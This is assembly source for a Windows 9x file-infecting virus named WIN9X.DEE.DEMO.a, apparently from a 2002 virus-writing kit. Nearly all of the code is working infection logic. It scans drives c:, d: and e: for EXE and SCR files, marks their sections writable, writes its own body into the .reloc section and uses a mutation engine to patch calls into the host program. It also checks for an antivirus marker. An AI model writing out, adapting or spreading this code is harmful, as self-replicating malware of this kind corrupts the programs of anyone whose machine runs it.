;Example virus WIN9X.DEE.DEMO.a based on DEE & DIZX32 engines & VXSC kit
;Searches pe-files on dirives c:\ ,d:\,e:\ & infect it with DEE.
;
;On start checking it's present in memory with atoms.Then creates new thread
;and searches and infects files.
;						(c) necr0mancer 2002

include win.inc
include vxsc11\vxsc.ash					;include macroses & constants
include demo.def					;define paramethers
include vxsc11\pe.inc

include inc\kernel32.inc
extrn	ExitProcess:near
extrn   MessageBoxA:near

ATOM			equ 		"DEM0"

	.586p
	.model flat
	.data

vsc_title:	db "WIN9X.DEE.Demo.a",0
vsc_msg:	db "WIN9X.DEE.Demo.a has been started",10,13,10,13
		db " - File search thread was activated ",10,13
		db " - Atom name is '",ATOM,"'",0

	.code
host:
		call virstart

	        push MB_ICONEXCLAMATION
        	push offset vsc_title
        	push offset vsc_msg
	        push 0
        	call MessageBoxA


		push 0
		call ExitProcess

; # 	on entry we gets adress in stack of next command
; #	therefore we have to clear stack from it.
; #
; #
; #

virstart:
		pushfd						;save host flags
		pusha						;& registers

		int 3						;for debug

		call delta
delta:		pop ebp

@@x		equ		<-offset delta>

		mov edi,[esp+4*8+4]				;esi=return adress

		smov ecx,5
		sub edi,ecx					;sub edi,5
		mov [esp+4*8+4],edi				;return adress
	
		lea esi,[ebp+ old_cmd @@x]			;restore old cmd
		rep movsb


ifdef VXTYPE_WIN32
		db (0b8h or @esi)				;mov esi,xxxxxxx
ibase: 		dd 00400000h	

		;esi = imagebase
		call find_kernel_imagebase
		or eax,eax					;kernelsearch failed?
		jz _to_host					;go to home
		
		xchg esi,eax
		mov [ebp+s_kernel @@x],esi			;save kernel adress
endif
		
		lea edx,[ebp+atom_name @@x]
		call findatom
		jnc _to_host

		lea edx,[ebp+atom_name @@x]
		call addatom
		mov [ebp+atom_handler @@x],eax

		mov [ebp+thread_delta @@x],ebp
		mov [ebp+replace_delta @@x],ebp
		mov [ebp+infect_delta @@x],ebp

		lea edx,[ebp+offset thread_proc @@x]
		call cthread
		mov [ebp+thread_id @@x],eax

_to_host:

		popa
		popfd
		ret


;Into thread.
thread_proc:
		mov ebp,12345678h
		thread_delta equ $-4

		call randomize
		mov [ebp+seed @@x],eax

		mov esi,[ebp+s_kernel @@x]
		lea eax,[ebp+offset infect @@x]

		pushx c:\#					;c drive
		mov edx,esp					;edx=offset to string
		call dirwalk					;Search for files
		pop edx

		pushx d:\#					;c drive
		mov edx,esp					;edx=offset to string
		call dirwalk					;Search for files
		pop edx

		pushx e:\#					;c drive
		mov edx,esp					;edx=offset to string
		call dirwalk					;Search for files
		pop edx

		mov eax,[ebp+atom_handler @@x]
		call delatom					;kill atom

		mov eax,[ebp+thread_id @@x]
		call kthread					;kill thread

;~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

infect	proc
		;EDX=fill filename
		pusha
		
		mov ebp,12345678h
		infect_delta equ $-4
		
	        mov esi,edx		            		;esi=edx=full name
_findzero:
	        lodsb                         
       		or al,al
	        jnz _findzero

       		mov eax,[esi-4]

	        cmp eax,'EXE'	     
       		je _lets_go

	        cmp eax,'exe'	     
       		je _lets_go

	        cmp eax,'scr'	     
       		je _lets_go

	        cmp eax,'SCR'  
       		je _lets_go
		
		jmp iexit
_lets_go:

;* fopen     (In:edx=offset to filename,[esi]/Out:ebx=file handle,cf=1 if error)
		mov esi,[ebp+s_kernel @@x]


	        call fopen
		jc iexit

		;EBX=handle
		push ebx					;save file handle

;* fmap      (In:ebx=file handle,[esi]/Out eax=mapped memory,cf=1 if error)
		call fmap
                jc  iclose


		mov ebx,eax					;ebx=begin of memory
		xchg edx,eax

	        cmp word ptr [edx+18h],40h
       		jne imap

	        mov eax,[edx+3ch]
       		add edx,eax                   			;EDX=offset of PE header
       		cmp 4 ptr[edx.pe_signature],'EP'   		;PE \0 \0	
       		jne imap

	        cmp 4 ptr [ebx.mz_oemInfo],'baLK'		;check signature( Kaspersky Lab (x))
     		je imap

		movzx eax,word ptr[edx.pe_NThsize]
		lea eax,[edx+eax+18h]				;eax=object table
		
		mov ecx,[edx.pe_RVA]				;get RVA
		sub ecx,[eax.pe_Obj_vOffset]			;ecx=RVA-virtual .code offset
		
		add ecx,[eax.pe_Obj_pOffset]			;esi=physical offset of .code

		add ecx,ebx					;edi=mem with code
		xchg edi,ecx
								;eax=object table

                movzx ecx,word ptr[edx.pe_numObjects]		;ecx=number of objects 
		dec ecx

		push esi					;save kernel base
		mov esi,eax					;esi=offset objtable
find_reloc:

		imul eax,ecx,40					;eax=num_obj*40
		cmp 4 ptr [(eax+esi).pe_Obj_name],'ler.'
		je freloc
		loop find_reloc

		pop esi
		jmp imap
freloc:

;~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
;~				RELOC IS FINDED NOW
;~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

 		lea ecx,[eax+esi]			;ecx=reloc desc. section offset

		cmp 4 ptr[ecx.pe_Obj_pSize],virsize+4096;check reloc size
		jb imap_pop
                           
	        or [esi.pe_Obj_flags],0E0000020h	;esi=1st section(code)
	        or [ecx.pe_Obj_flags],0E0000020h	;reloc section
	        mov [ebx.mz_oemInfo],'baLK'		;set signature


ifdef VXTYPE_WIN32

		push 4 ptr [edx.pe_imagebase]
		pop  4 ptr [ebp+ibase @@x]		;seve imagebase
endif
		;EDI=offset of RVA

		push 4096				;get random value
		call rnd				
		add esp,4				;clear stack
		
		push edi
		xchg eax,edi				;edi=random value
		
		mov eax,[ecx.pe_Obj_vOffset]		;reloc RVA
		add eax,ebx				;correct for replacer
		add eax,edi

	 	sub eax,[esi.pe_Obj_vOffset]
		add eax,[esi.pe_Obj_pOffset]		;eax=code_RVA-code_offset
		mov [ebp+reloc_offs @@x],eax 		;save for DEE && replacer

		mov eax,[ecx.pe_Obj_pOffset]		;eax=PE_reloc_offset+random value
		add eax,ebx				;EAX=mem offset of .reloc
		add eax,edi

		pop edi

		pop esi					;esi=kernel base
		push eax				;reloc physical offset(for mov)

		mov ecx,12000				;~12 kb for all work;)
		call getmem

		push eax
		
		lea ecx,[ebp+rnd @@x]			;-| random proc
		push ecx                                ;-|

		lea ecx,[ebp+replacer @@x]              ;-| replacer proc
		push ecx                                ;-|

		push 4096				;see 4kb commands

		push eax                                ;bufer
		push edi				;code
		call dee
		add esp,4*5

		pop eax	
 		call freemem

		pop edi					;edi=reloc section offset

		push esi
		mov ecx,(virsize/4+1)
		lea esi,[ebp+virstart @@x]		;ESI=virstart
		rep movsd				;movsd*(x/4 times) faster than movsb*x times
imap_pop:
		pop esi

;~~~~~~~~~~~~~~ there process errors ~~~~~~~~~~~~~~
imap:
		xchg ebx,eax
		call fmapclose
iclose:
		pop ebx
                call fclose
iexit:
		popa
		retn
infect 	endp


;<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<
@@random_max              equ             [esp+4*8]+4
@@rd			  equ 		  <-offset random_delta>
;>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>

rnd:
	        pusha

		call random_delta
random_delta:
		pop ebp

	        db 0b8h                 	                ;mov eax,xxxxxxxx
seed    	dd 12345678h

		imul eax,eax,134775813               	        ;eax=new seed
	        inc eax
        	mov [ebp+seed @@rd],eax

	        xor edx,edx

		mov ecx,@@random_max
	        jecxz div_0
	        div ecx

        	mov [esp._eax],edx
div_0:
	        popa
		ret
;>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>




;void Replace( 
;              dword 		begin_offset
;              dword 		offset of commnad
;              opcode 		command
;            );
;
;<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<
@@Cbegin 	 	equ	[esp+4*8]+4
@@Coffset		equ	[esp+4*8+4]+4
@@Cmd  			equ	[esp+4*8+8]+4
;>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
replacer:
		pusha	

		mov esi,@@Coffset				;save old command
		push esi

		mov ebp,12345678h
		replace_delta equ $-4

		lea edi,[ebp+old_cmd @@x]
		movsd						;copy 5 bytes
		movsb                                           ;esi=esi+5

		pop edi						;write call opcode
		mov al,0E8h
		stosb

		mov eax,[ebp+reloc_offs	@@x]			;eax=reloc offset
		sub eax,esi					;eax= reloc_offs-cmd_offs-5;call size

		stosd						;stos relative offset		

		popa
		ret

include vxsc11\vxsc.inc					;include vxsc library
include dee.inc                                         ;dee engine 

old_cmd		db 	0b8h,0,0,0,0			;mov eax,0
atom_name       db 	ATOM,0

virsize 		equ $-offset virstart

;=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
        db 'DEE.Demo.'
        db virsize/1000 mod 10 + '0'
        db virsize/100  mod 10 + '0'
        db virsize/10   mod 10 + '0'
        db virsize/1    mod 10 + '0'
;=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=

thread_id	dd 	?
s_kernel 	dd 	?
atom_handler	dd 	?
reloc_offs	dd	?

end	host